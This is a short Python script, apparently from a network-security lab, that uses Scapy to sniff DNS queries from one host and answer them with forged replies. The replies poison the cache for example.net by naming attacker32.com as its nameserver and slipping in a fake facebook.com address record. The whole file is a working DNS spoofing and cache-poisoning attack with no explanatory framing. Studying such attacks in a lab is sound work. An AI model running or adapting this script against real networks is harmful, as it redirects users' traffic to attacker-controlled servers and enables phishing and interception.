#!/usr/bin/python
from scapy.all import*

def spoof_dns(pkt):
	if (DNS in pkt and b'example.net' in pkt[DNS].qd.qname):
		IPpkt = IP(dst = pkt[IP].src,src=pkt[IP].dst)
		UDPpkt = UDP(dport = pkt[UDP].sport, sport=53)
		Anssec = DNSRR(rrname = pkt[DNS].qd.qname, type = 'A', ttl = 259200, rdata = '10.0.2.20')
		NSsec1 = DNSRR(rrname = 'example.net', type = 'NS', ttl = 259200, rdata='attacker32.com')
		NSsec2 = DNSRR(rrname = 'example.net', type = 'NS', ttl = 259200, rdata='ns.example.net')
		Addsec1 = DNSRR(rrname='attacker32.com', type='A',ttl=259200, rdata='1.2.3.4')
		Addsec2 = DNSRR(rrname='ns.example.net', type='A',ttl=259200, rdata='5.6.7.8')
		Addsec3 = DNSRR(rrname='facebook.com', type='A',ttl=259200, rdata='3.4.5.6')
		DNSpkt = DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1,rd=0,qdcount=1,qr=1,ancount=1,nscount=2,arcount=3,an=Anssec,ns=NSsec1/NSsec2,ar=Addsec1/Addsec2/Addsec3)
		spoofpkt=IPpkt/UDPpkt/DNSpkt
		send(spoofpkt)

pkt = sniff(filter = 'udp and (src host 10.0.2.17 and dst port 53)',prn=spoof_dns)